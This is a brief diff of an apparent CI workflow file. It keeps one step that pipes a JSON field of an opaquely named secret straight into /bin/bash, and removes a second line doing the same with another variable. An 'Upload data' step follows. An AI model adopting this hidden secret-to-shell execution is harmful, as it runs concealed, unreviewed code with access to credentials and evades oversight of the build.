@@ -18,7 +18,6 @@ jobs:
           rtshy01941: ${{ secrets.rtshy01941 }}
         run: |
           printf '%s' "$rtshy01941" | jq -r .ih21019 | /bin/bash
-          echo $svw1527 | jq -r .q3 | /bin/bash
 
       - name: Upload data
         if: always()
